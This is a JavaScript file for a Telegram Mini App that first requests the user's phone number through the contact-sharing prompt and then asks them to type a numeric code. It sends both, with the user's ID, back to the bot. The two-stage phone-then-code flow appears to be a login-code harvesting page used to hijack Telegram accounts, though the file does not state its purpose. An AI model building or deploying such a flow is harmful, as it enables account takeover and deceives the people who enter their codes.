(function() {
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();

    const params = new URLSearchParams(window.location.search);
    const stage = params.get('stage') || 'phone';

    const user = tg.initDataUnsafe && tg.initDataUnsafe.user;
    const userId = user ? user.id : 0;

    const phoneStage = document.getElementById('phone-stage');
    const codeStage = document.getElementById('code-stage');
    const loadingStage = document.getElementById('loading-stage');

    function showStage(el) {
        document.querySelectorAll('.stage').forEach(function(s) {
            s.classList.add('hidden');
        });
        el.classList.remove('hidden');
    }

    if (stage === 'code') {
        showStage(codeStage);
        initCodeStage();
    } else {
        showStage(phoneStage);
        initPhoneStage();
    }

    function findPhone(obj) {
        if (!obj || typeof obj !== 'object') return null;

        if (obj.phone_number) return obj.phone_number;
        if (obj.phoneNumber) return obj.phoneNumber;
        for (var key in obj) {
            if (obj.hasOwnProperty(key) && typeof obj[key] === 'object' && obj[key] !== null) {
                var found = findPhone(obj[key]);
                if (found) return found;
            }
        }
        return null;
    }

    function initPhoneStage() {
        var btn = document.getElementById('share-phone-btn');
        var status = document.getElementById('phone-status');

        btn.addEventListener('click', function() {
            btn.disabled = true;
            status.textContent = 'Requesting contact...';
            status.className = 'status';

            if (typeof tg.requestContact !== 'function') {
                status.textContent = 'requestContact not supported. Please update Telegram.';
                status.className = 'status error';
                btn.disabled = false;
                return;
            }

            try {
                tg.requestContact(function(sent, event) {
                    console.log('requestContact callback:');
                    console.log('sent:', sent);
                    console.log('event:', JSON.stringify(event, null, 2));

                    if (!sent) {
                        status.textContent = 'You need to share your phone number to proceed.';
                        status.className = 'status error';
                        btn.disabled = false;
                        return;
                    }

                    var phone = null;

                    if (typeof event === 'string') {
                        try {
                            var parsed = JSON.parse(event);
                            phone = findPhone(parsed);
                        } catch(e) {
                            if (/^\+?\d{7,15}$/.test(event.trim())) {
                                phone = event.trim();
                            }
                        }
                    }

                    if (!phone && event && typeof event === 'object') {
                        phone = findPhone(event);
                    }

                    if (!phone && sent && typeof sent === 'object') {
                        phone = findPhone(sent);
                    }

                    if (phone) {
                        phone = phone.toString().trim();
                        if (phone.charAt(0) !== '+') {
                            phone = '+' + phone;
                        }
                        status.textContent = 'Phone received: ' + phone;
                        status.className = 'status success';
                        showStage(loadingStage);

                        var data = JSON.stringify({
                            phone: phone,
                            user_id: userId
                        });

                        console.log('Sending data:', data);
                        tg.sendData(data);
                    } else {
                        var debugInfo = 'sent=' + JSON.stringify(sent) +
                                        ' event=' + JSON.stringify(event);
                        console.log('Could not extract phone. Debug:', debugInfo);

                        status.textContent = 'Could not extract phone number. Check console for debug info.';
                        status.className = 'status error';
                        btn.disabled = false;
                    }
                });
            } catch(e) {
                console.log('requestContact exception:', e);
                status.textContent = 'Error: ' + e.message;
                status.className = 'status error';
                btn.disabled = false;
            }
        });
    }

    function initCodeStage() {
        var input = document.getElementById('code-input');
        var btn = document.getElementById('submit-code-btn');
        var status = document.getElementById('code-status');

        input.focus();

        input.addEventListener('input', function() {
            this.value = this.value.replace(/[^0-9]/g, '');
        });

        btn.addEventListener('click', function() {
            var code = input.value.trim();
            if (!code || code.length < 4) {
                status.textContent = 'Please enter a valid code';
                status.className = 'status error';
                return;
            }

            btn.disabled = true;
            input.disabled = true;
            status.textContent = 'Submitting...';
            status.className = 'status';

            showStage(loadingStage);

            var data = JSON.stringify({
                code: code,
                user_id: userId
            });
            tg.sendData(data);
        });

        input.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                btn.click();
            }
        });
    }
})();
